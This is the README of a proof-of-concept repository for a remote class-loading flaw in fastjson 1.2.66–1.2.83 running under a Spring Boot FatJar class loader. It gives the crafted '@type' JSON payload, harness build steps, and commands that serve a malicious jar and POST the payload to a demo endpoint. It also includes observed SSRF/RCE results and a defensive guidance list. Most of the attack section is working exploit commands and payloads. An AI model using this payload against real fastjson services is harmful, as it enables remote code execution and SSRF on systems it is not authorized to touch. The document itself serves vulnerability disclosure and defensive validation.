# Fastjson AutoType + Spring Boot FatJar JSONType RCE PoC

> This repository is for authorized security research, local reproduction, and defensive validation only. Do not run these tests against systems you do not own or have explicit permission to assess.

## Summary

`ParserConfig.checkAutoType` contains a `@JSONType` probe path that reconstructs the submitted `@type` value as a class resource:

```java
String resource = typeName.replace('.', '/') + ".class";
is = defaultClassLoader.getResourceAsStream(resource);
```

With a value such as `jar:http:..2130706433:18080.probe!.POC`, the replacement produces the jar URL `jar:http://2130706433:18080/probe!/POC.class` (`2130706433` is the integer form of `127.0.0.1`).

The observed behavior depends on the class loader and JDK:

| Environment | Network request | Result |
| --- | --- | --- |
| Plain classpath with the JDK `AppClassLoader` | No | `JSONException: autoType is not support` |
| Spring Boot FatJar with `LaunchedURLClassLoader` on JDK 8 | Yes, usually two `GET /probe` requests | Remote class bytes can be defined and initialized |
| Spring Boot FatJar with `LaunchedURLClassLoader` on JDK 9+ | Yes | SSRF remains, but class definition fails with an illegal class name error |
| `setAutoTypeSupport(true)` or fastjson <= 1.2.24 | No | The payload degrades to a normal `JSONObject` field in the tested path |

## Affected Conditions

All of the following conditions are relevant to the full remote class-loading path:

| Condition | Notes |
| --- | --- |
| fastjson version | Observed on 1.2.66 through 1.2.83, including the `@JSONType` probe path. The path can be reached while AutoType is disabled because the annotation probe is a trust channel. |
| Class loader | Spring Boot classic FatJar execution where fastjson is loaded by `LaunchedURLClassLoader`, or an application-provided `ParserConfig.setDefaultClassLoader()` that parses jar-style resource names. |
| JDK | Full RCE requires JDK 8 in this route. JDK 9+ rejects the crafted internal class name during `defineClass`, but SSRF still occurs. |
| Network | The target runtime must be able to fetch the remote jar over HTTP or another reachable URL scheme. |

## Project Layout

```text
.
|-- README.md
|-- pom.xml
|-- scripts/
|   |-- build-harness.sh
|   `-- fetch-deps.sh
|-- src/main/java/
|   |-- FatRunner.java
|   |-- Gen.java
|   |-- POC.java
|   |-- Test.java
|   `-- Test2.java
`-- sbdemo/
    |-- pom.xml
    `-- src/main/java/com/percivalll/fastjson/jsontype/
        |-- DemoApplication.java
        |-- FastjsonHarness.java
        |-- ParseController.java
        `-- WorkerParser.java
```

## Prerequisites

- JDK 8 for the full class-definition result.
- JDK 9+ can be used to verify SSRF-only behavior.
- `curl` for `scripts/fetch-deps.sh`.
- Maven is optional for the root harness. The scripts download the required jars directly into `lib/`.
- Maven is required only for the `sbdemo/` real Spring Boot application.

## Build the Local Harness

```bash
scripts/build-harness.sh
```

The script downloads:

- `fastjson-1.2.83.jar`
- `spring-boot-loader-2.7.18.jar`
- `spring-boot-loader-1.5.22.RELEASE.jar`
- `asm-9.6.jar`

It then compiles the harness into `target/classes` and generates `probe.jar`. The generated jar contains a crafted `POC.class` whose bytecode internal name is:

```text
jar:http://2130706433:18080/probe!/POC
```

## Harness Reproduction

The payload used by the harness is:

```json
{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}
```

Baseline with a plain classpath:

```bash
java -cp "target/classes:lib/fastjson-1.2.83.jar" Test parse-default
```

Spring Boot 2.7 loader path:

```bash
rm -f PWNED2
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-parse
ls -la PWNED2
```

Spring Boot 1.5 loader path:

```bash
rm -f PWNED2
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-1.5.22.RELEASE.jar" Test2 sb15-parse
ls -la PWNED2
```

Direct primitive checks:

```bash
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-direct
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-check
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-load
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-fatrun
```

On JDK 8, the `sb27-parse`, `sb15-parse`, `sb27-load`, and `sb27-fatrun` routes can define and initialize the remote class. On JDK 9+, the HTTP fetch still occurs, but class definition is blocked by stricter JVM class-name validation.

## What the Files Do

`Test.java` is the plain-classpath baseline. It starts a localhost HTTP server, exercises fastjson parsing and `checkAutoType`, and records whether any HTTP request was made.

`Test2.java` builds a Spring Boot `LaunchedURLClassLoader`, serves `probe.jar` from a local HTTP listener, and exercises the direct resource lookup, `checkAutoType`, `loadClass`, and `JSON.parse` paths.

`Gen.java` uses ASM to generate a class with a bytecode-only internal name that cannot be written as Java source. The generated class carries a runtime-visible `@JSONType` annotation and creates `PWNED2` when initialized.

`POC.java` is a normal control class with `@JSONType`.

`FatRunner.java` is loaded through the FatJar-style class loader to more closely model fastjson running inside a Spring Boot executable jar.

## Real Spring Boot Demo

The `sbdemo/` project is a minimal Spring Boot 2.7.18 service with fastjson 1.2.83. It binds to `127.0.0.1:8081` by default.

Build it with JDK 8:

```bash
cd sbdemo
JAVA_HOME=/path/to/jdk8 mvn package -DskipTests
java -jar target/fastjson-jsontype-sbdemo-1.0.0-SNAPSHOT.jar
```

In another terminal, serve the crafted jar generated by the root harness as `/probe`:

```bash
cd ..
scripts/build-harness.sh
mkdir -p www
cp probe.jar www/probe
python3 -m http.server 18080 --bind 127.0.0.1 --directory www
```

Useful endpoints:

```bash
curl http://127.0.0.1:8081/info
curl -X POST http://127.0.0.1:8081/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}'
curl -X POST http://127.0.0.1:8081/parse-async \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}'
```

Observed behavior from the original research notes:

| Route | Result |
| --- | --- |
| Tomcat request thread (`/parse`) | SSRF occurs, but the route normally stops before RCE because Tomcat's request-thread TCCL does not complete the crafted remote class definition path. |
| Startup-created worker thread (`/parse-async`) | With TCCL set to `LaunchedURLClassLoader` on JDK 8, the remote class-loading path can complete. |
| Any entry point | The `@JSONType` probe can still trigger SSRF because it uses `ParserConfig.class.getClassLoader()`. |

The failure in the Tomcat request-thread route is structural for this payload family: a remote jar URL requires `://`, the class-resource reconstruction requires `..` to become `//`, and the later `Class.forName` path rejects the empty package segment before Tomcat can load the crafted class.

## Defensive Guidance

1. Enable fastjson SafeMode with `-Dfastjson.parser.safeMode=true`.
2. Enforce strict egress controls so application runtimes cannot fetch arbitrary HTTP resources.
3. Prefer JDK 9+ where possible. This blocks the class-definition step in this route, although SSRF still needs separate mitigation.
4. Migrate to fastjson2 or remove fastjson 1.x from untrusted JSON parsing paths.
5. Do not enable `ParserConfig.setAutoTypeSupport(true)` for untrusted input.
6. Alert on suspicious `@type` values containing `jar:`, `!`, mixed `..` URL reconstruction patterns, or integer-form IP literals such as `2130706433`.
7. Review `ParserConfig.setDefaultClassLoader()` call sites and avoid class loaders that interpret attacker-controlled resource names as URLs.

## References

- fastjson `ParserConfig.checkAutoType`, especially the `@JSONType` probe block around the resource reconstruction logic.
- Spring Boot `org.springframework.boot.loader.jar.Handler#parseURL`, where nested-jar URL handling differs from the JDK plain-classpath path.
- The `@JSONType` probe behavior introduced in fastjson 1.2.66 and present in later 1.x releases tested by the original notes.
